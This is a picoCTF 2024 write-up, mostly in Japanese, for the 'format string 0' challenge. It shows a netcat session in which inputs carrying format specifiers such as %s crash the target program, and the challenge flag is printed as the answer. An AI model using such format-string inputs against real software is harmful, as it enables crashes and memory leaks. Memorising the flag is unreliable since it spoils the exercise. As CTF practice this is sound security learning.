# format string 0:Binary Exploitation

Can you use your knowledge of format strings to make the customers happy?\
Download the binary [here](https://github.com/colza12/ctf_writeup/blob/main/picoCTF%202024/format%20string%200/format-string-0).\
Download the source [here](https://github.com/colza12/ctf_writeup/blob/main/picoCTF%202024/format%20string%200/format-string-0.c).
Connect with the challenge instance here: `nc mimas.picoctf.net 60866`

# Solution

タイトルが「format string」となっているのでおそらくformat string attack(書式文字列攻撃)でフラグが得られるのだろう。とりあえず、`nc mimas.picoctf.net 60866`を実行してみる。
```
$ nc mimas.picoctf.net 60866
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}
```
フラグが出てきてしまった。

`picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}`


`Enter your recommendation`のところでどうしてその選択肢を選んだのかを説明していく。
最初の選択肢は、`Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe`の3つ。書式文字列攻撃を念頭におくと、%が含まれている選択肢が怪しいと考えた。`Gr%114d_Cheese`を入力すると次に進んだ。
2回目の選択肢は、`Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak`の3つ。これも最初の選択肢と同様に%が含まれている選択肢を選ぶわけだが、2つあることに気づく。`%t`と`%s`を比較してフラグが出てきそうなのは`%s`なので`Cla%sic_Che%s%steak`を選び、入力した。すると、フラグが得られた。
